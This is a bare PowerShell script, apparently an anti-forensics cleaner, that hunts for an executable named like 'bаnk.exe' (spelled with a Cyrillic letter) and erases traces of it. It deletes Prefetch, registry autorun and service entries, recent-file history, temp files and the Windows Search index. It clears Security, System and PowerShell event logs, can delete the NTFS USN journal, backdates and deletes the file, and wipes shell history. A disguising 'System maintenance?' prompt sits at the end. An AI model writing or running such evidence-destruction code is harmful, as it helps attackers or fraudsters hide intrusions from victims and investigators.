function Find-File{
    $sp=@("C:\","C:\Users\$env:USERNAME\","C:\Program Files\","C:\Program Files (x86)\","D:\","E:\")
    foreach($p in$sp){if(Test-Path $p){$f=Get-ChildItem -Path $p -Filter "*bаnk.exe" -Recurse -ErrorAction SilentlyContinue|Select-Object -First 1
    if($f){return $f.FullName}}}
    return $null
}

function Clean-File{
    param([string]$FilePath,[switch]$FullMode=$false)
    $fn=Split-Path $FilePath-Leaf
    $en=[regex]::Escape($fn)
    $al=@()
    $ln=$fn-replace[char]0x0430,[char]0x0061
    if($ln-ne$fn){$al+=$ln}
    $cn=$fn-replace[char]0x0061,[char]0x0430
    if($cn-ne$fn){$al+=$cn}
    try{$st=[System.IO.File]::OpenRead($FilePath)
    $sh=[System.Security.Cryptography.SHA256]::Create()
    $hb=$sh.ComputeHash($st)
    $fh=[BitConverter]::ToString($hb)-replace'-',''
    $st.Close()}catch{$fh=""}
    $pf=Get-ChildItem "C:\Windows\Prefetch" -Filter "*.pf" -ErrorAction SilentlyContinue
    foreach($p in$pf){$pc=""
    try{$pc=Get-Content $p.FullName -Raw -ErrorAction SilentlyContinue}catch{}
    if($pc-ne$null){$sd=$false
    if($pc-match$en){$sd=$true}
    foreach($an in$al){$ar=[regex]::Escape($an)
    if($pc-match$ar){$sd=$true}}
    if($fh-ne""-and$pc-match$fh.Substring(0,16)){$sd=$true}
    if($sd){Remove-Item $p.FullName -Force -ErrorAction SilentlyContinue}}}
    $rp=@("HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run","HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce","HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run","HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce","HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options","HKLM:\SYSTEM\CurrentControlSet\Services","HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU","HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
    $sp=@($en)+$al
    foreach($r in$rp){if(Test-Path $r){try{Get-ChildItem $r -ErrorAction SilentlyContinue|ForEach-Object{$k=$_
    foreach($p in$sp){if($k.PSChildName-match$p){Remove-Item $k.PSPath -Recurse -Force -ErrorAction SilentlyContinue}}
    $v=Get-ItemProperty $k.PSPath -ErrorAction SilentlyContinue
    if($v){$v.PSObject.Properties|ForEach-Object{$pv=$_.Value.ToString()
    foreach($p in$sp){if($pv-match$p-or($fh-ne""-and$pv-match$fh)){Remove-ItemProperty -Path $k.PSPath -Name $_.Name -Force -ErrorAction SilentlyContinue}}}}}}catch{}}}
    $ec=@(@{L="Security";I=4688},@{L="System";I=7036},@{L="Microsoft-Windows-PowerShell/Operational";I=4104})
    foreach($es in$ec){try{$ev=Get-WinEvent -FilterHashtable @{LogName=$es.L;ID=$es.I} -ErrorAction SilentlyContinue|Where-Object{$f=$false
    foreach($p in$sp){if($_.Message-match$p){$f=$true;break}}
    $f-or($fh-ne""-and$_.Message-match$fh)}
    if($ev){$tf="$env:TEMP\tmp_$([System.Guid]::NewGuid()).evtx"
    wevtutil epl $es.L $tf 2>$null
    wevtutil cl $es.L 2>$null
    Remove-Item $tf -Force -ErrorAction SilentlyContinue}}catch{}}
    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force -ErrorAction SilentlyContinue
    $tp=@($env:TEMP,"$env:SystemRoot\Temp",[System.IO.Path]::GetTempPath())
    foreach($t in$tp){if(Test-Path $t){Get-ChildItem $t -ErrorAction SilentlyContinue|Where-Object{foreach($p in$sp){if($_.Name-match$p){return$true}};return$false}|Remove-Item -Recurse -Force -ErrorAction SilentlyContinue}}
    Stop-Service "WSearch" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    $si=@("C:\ProgramData\Microsoft\Search\Data\Applications\Windows","$env:APPDATA\Microsoft\Search\Data")
    foreach($s in$si){if(Test-Path $s){Get-ChildItem $s -Filter "*.edb" -ErrorAction SilentlyContinue|Remove-Item -Force}}
    Start-Service "WSearch" -ErrorAction SilentlyContinue
    if($FullMode){fsutil usn deletejournal /D C: 2>$null}
    if(Test-Path $FilePath){$f=Get-Item $FilePath -Force
    $rd=Get-Date "2020-11-15"
    $f.CreationTime=$rd
    $f.LastWriteTime=$rd
    $f.LastAccessTime=$rd
    Get-Item $FilePath -Stream * -ErrorAction SilentlyContinue|Where-Object Stream -ne ':$DATA'|ForEach-Object{Remove-Item -Path $FilePath -Stream $_.Stream -ErrorAction SilentlyContinue}
    Remove-Item $FilePath -Force -ErrorAction SilentlyContinue}
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force -ErrorAction SilentlyContinue 2>$null
    Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" -Name "*" -ErrorAction SilentlyContinue
}

$autoPath=Find-File
if($autoPath){$FilePath=$autoPath}else{exit}
$fc=Read-Host "System maintenance? (Y/N)"
$fm=($fc-eq'Y')
Clean-File -FilePath $FilePath -FullMode:$fm
Clear-History
Remove-Item(Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue 2>$null